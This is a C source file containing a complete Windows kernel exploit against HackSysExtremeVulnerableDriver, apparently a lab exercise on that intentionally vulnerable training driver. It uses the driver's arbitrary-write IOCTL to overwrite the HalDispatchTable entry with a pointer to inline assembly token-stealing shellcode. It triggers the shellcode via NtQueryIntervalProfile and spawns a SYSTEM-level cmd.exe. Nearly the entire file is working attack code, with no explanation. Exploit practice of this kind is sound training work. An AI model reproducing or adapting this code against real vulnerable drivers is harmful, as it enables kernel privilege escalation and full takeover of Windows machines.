#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#define KTHREAD_OFFSET          0x124		//+0x124 CurrentThread      : Ptr32 _KTHREAD
#define EPROCESS_OFFSET         0x050		//+0x050 Process            : Ptr32 _KPROCESS
#define FLINK_OFFSET            0x0b8		//+0x0b8 ActiveProcessLinks : _LIST_ENTRY
#define PID_OFFSET              0x0b4		//+0x0b4 UniqueProcessId    : Ptr32 Void
#define TOKEN_OFFSET            0x0f8		//+0x0f8 Token              : _EX_FAST_REF
#define SYSTEM_PID              0x004		//System Process ID
#define SysModuleInfoCall       0x00b           //SystemModuleInformation Call
#define CASE_ID			0x22200B

typedef struct _WRITE_WHAT_WHERE {
  PULONG_PTR What;
  PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

typedef NTSTATUS(WINAPI* pNtQuerySystemInformation)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
  OUT PVOID SystemInformation,
  IN ULONG SystemInformationLength,
  OUT PULONG ReturnLength);

typedef NTSTATUS(WINAPI* pNtQueryIntervalProfile)(IN ULONG ProfileSource,
  OUT PULONG Interval);

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
  PVOID  Unknown1;
  PVOID  Unknown2;
  PVOID  Base;
  ULONG  Size;
  ULONG  Flags;
  USHORT Index;
  USHORT NameLength;
  USHORT LoadCount;
  USHORT PathLength;
  CHAR   ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
  ULONG   Count;
  SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

PVOID GetHalTable()
{
  HMODULE hNtDll = LoadLibraryA("ntdll.dll");
  if (!hNtDll)
  {
    printf("[-] Failed to load the ntdll.dll, error:%d\n", GetLastError());
    exit(1);
  }

  pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtDll, "NtQuerySystemInformation");
  if (!NtQuerySystemInformation)
  {
    printf("[-] Failed to get the NtQuerySystemInformation's address, error:%d\n", GetLastError());
    exit(1);
  }
  else
  {
    printf("[+] NtQuerySystemInformation's address: 0x%x\n", NtQuerySystemInformation);
  }

  ULONG bufLength = 0;
  NtQuerySystemInformation(SysModuleInfoCall, NULL, 0, &bufLength);
  PSYSTEM_MODULE_INFORMATION sysModuleInfo = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufLength);
  if (!sysModuleInfo)
  {
    printf("[-] Failed to alloc a chunk for the SYSTEM_MODULE_INFORMATION, error:%d\n", GetLastError());
    exit(1);
  }

  NTSTATUS status = NtQuerySystemInformation(SysModuleInfoCall, sysModuleInfo, bufLength, &bufLength);
  if (!NT_SUCCESS(status))
  {
    printf("[-] Failed to get the SYSTEM_MODULE_INFORMATION, error:%d\n", GetLastError());
    exit(1);
  }

  PVOID kernelBaseAddr = sysModuleInfo->Module[0].Base;
  PCHAR kernelImage = sysModuleInfo->Module[0].ImageName;
  kernelImage = strrchr(kernelImage, '\\') + 1;
  printf("[+] kernel module: %s\n", kernelImage);
  printf("[+] Kernel base_address: 0x%x\n", kernelBaseAddr);

  HMODULE hKernel2User = LoadLibraryA(kernelImage);
  if (!hKernel2User)
  {
    printf("[-] Failed to load %s, error:%d\n", kernelImage, GetLastError());
    exit(1);
  }

  PVOID hHalDispatchTable = (PVOID)GetProcAddress(hKernel2User, "HalDispatchTable");
  if (!hHalDispatchTable)
  {
    printf("[-] Failed to get the HalDispatchTable's address, error:%d\n", GetLastError());
    exit(1);
  }

  PVOID halDispatchTableAddr = (ULONG)hHalDispatchTable - (ULONG)hKernel2User + (ULONG)kernelBaseAddr;
  printf("[+] HalDispatchTable address: 0x%x\n", halDispatchTableAddr);

  HeapFree(GetProcessHeap(), 0, sysModuleInfo);

  FreeLibrary(hNtDll);
  FreeLibrary(hKernel2User);
  hNtDll = NULL;
  NtQuerySystemInformation = NULL;
  sysModuleInfo = NULL;

  return halDispatchTableAddr;
}

VOID TokenStealingShellcode()
{
  __asm
  {
    ; initialize
    pushad;
    mov eax, fs: [KTHREAD_OFFSET] ;		//get current thread
    mov ecx, [eax + EPROCESS_OFFSET];	        //get the process
    mov eax, ecx;
    mov ebx, SYSTEM_PID;

  SearchSystemPID:
    mov eax, [eax + FLINK_OFFSET];	        //get the ActiveProcessLinks
    sub eax, FLINK_OFFSET;
    mov edx, [eax + PID_OFFSET];		//get the PID
    cmp edx, ebx;
    jnz SearchSystemPID;

    mov edx, [eax + TOKEN_OFFSET];		//change the token
    mov [ecx + TOKEN_OFFSET], edx;

    ; recovery
    popad;
    add esp, 0xC;
    ret;
  }
}

int main()
{
  printf("**************************Start To Exploit**************************\n\n");
  printf("11     11       1111111111        11        11      111111111111111\n");
  printf("11   11         11                  11    11        11           11\n");
  printf("11 11           1111111111            1111          111111111111111\n");
  printf("11 11           1111111111            1111          11\n");
  printf("11   11         11                  11    11        11\n");
  printf("11     11       1111111111        11        11      11\n\n");
  printf("**************************Start To Exploit**************************\n");

  HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
          GENERIC_WRITE | GENERIC_READ,
          FILE_SHARE_READ | FILE_SHARE_WRITE,
          0,
          OPEN_EXISTING,
          FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
          0);

  if (hDevice == INVALID_HANDLE_VALUE)
  {
    printf("[-] Failed to open the file¡­¡­\n");
    exit(1);
  }
  else
  {
    printf("[+] Success to get the handle: 0x%x\n", (ULONG)hDevice);
  }

  PVOID halDispatchTableAddrPlus4 = (PVOID)((ULONG)GetHalTable() + 4);
  PULONG shellcodeTransit = (PULONG)TokenStealingShellcode;
  WRITE_WHAT_WHERE www;
  www.What = (PULONG_PTR)&shellcodeTransit;
  www.Where = (PULONG_PTR)halDispatchTableAddrPlus4;

  printf("[+] halDispatchTableAddrPlus4's address: 0x%x\n", halDispatchTableAddrPlus4);
  printf("[+] www's address: 0x%x\n", &www);
  printf("[+] www.What: 0x%x\n", www.What);
  printf("[+] www.Where: 0x%x\n", www.Where);

  ULONG retLength = 0;
  BOOL ret = DeviceIoControl(hDevice,
          CASE_ID,
          &www,
          sizeof(WRITE_WHAT_WHERE),
          NULL,
          0,
          &retLength,
          NULL);

  if (!ret)
  {
    printf("Failed to send message, error:%d", GetLastError());
    exit(1);
  }

  Sleep(5);
  HMODULE hNtDll = LoadLibraryA("ntdll.dll");
  if (!hNtDll)
  {
    printf("[-] Failed to load ntdll.dll in user mode, error:%d\n", GetLastError());
    exit(1);
  }

  pNtQueryIntervalProfile NtQueryIntervalProfile = (pNtQueryIntervalProfile)GetProcAddress(hNtDll, "NtQueryIntervalProfile");
  if (!NtQueryIntervalProfile)
  {
    printf("[-] Failed to get the NtQueryIntervalProfile's address, error:%d\n", GetLastError());
    exit(1);
  }
  else
  {
    printf("[+] NtQueryIntervalProfile's address: 0x%x\n", NtQueryIntervalProfile);
  }

  ULONG interval = 0;
  NtQueryIntervalProfile(0x1337, &interval);

  printf("[+] Success to execute the payload¡­¡­\n");

  STARTUPINFO si = { sizeof(STARTUPINFO) };
  PROCESS_INFORMATION pi;

  ZeroMemory(&si, sizeof(si));
  ZeroMemory(&pi, sizeof(pi));
  si.cb = sizeof(si);

  CreateProcess(L"C:\\Windows\\System32\\cmd.exe",
          NULL,
          NULL,
          NULL,
          0,
          CREATE_NEW_CONSOLE,
          NULL,
          NULL,
          &si,
          &pi);

  CloseHandle(hDevice);
  return 0;
}